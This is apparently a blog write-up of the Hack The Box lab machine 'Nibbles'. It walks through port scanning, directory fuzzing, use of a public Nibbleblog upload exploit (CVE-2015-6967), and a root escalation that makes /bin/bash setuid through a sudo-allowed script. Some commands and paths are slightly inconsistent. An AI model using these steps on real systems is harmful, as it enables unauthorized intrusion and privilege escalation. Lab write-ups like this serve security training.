---
title: Nibbles Machine HTB
date: 2023-02-1 00:18:00 +0700
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [machines]
---

## Enumeration

```ruby
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
| 2048 c4f8ade8f80477decf150d630a187e49 (RSA)
| 256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_ 256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Therefore, we will have to do the intrusion through the web, since we do not have SSH credentials.

The web page only has a ``Hello World`` , but in its source code we can find the `/nibbleblog/` directory so let's investigate it.

Applying a wfuzz to it:

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.129.225.129/nibbleblog/FUZZ/
```

We can see several directories, including `/admin, /languages, /plugins, /content and /themes` . 
Let's investigate `/admin` first. Unfortunately, we can't find much.
## User Exploit

On the main page, we see that it is created using niddleblog, so let's look for an exploit: 

Luckily, we found the following: https://github.com/dix0nym/CVE-2015-6967

Let's import it and run it:

To run it, we will have to go to the directory `/content/private/plugins/my_image/` and run the file named `image.php`.  

## Root Exploit

Doing `sudo -l` we see that we can run the file `/home/nibbler/personal/personal/stuff/monitor.sh` as root,
but as this does not exist, we create it with the following command inside

```bash
/bin/bash

chmod u+s /bin/bash
```

And we execute it: `sudo /.monitor.sh` -> `/bin/bash -p` and we can already see the root flag inside /root/root.txt
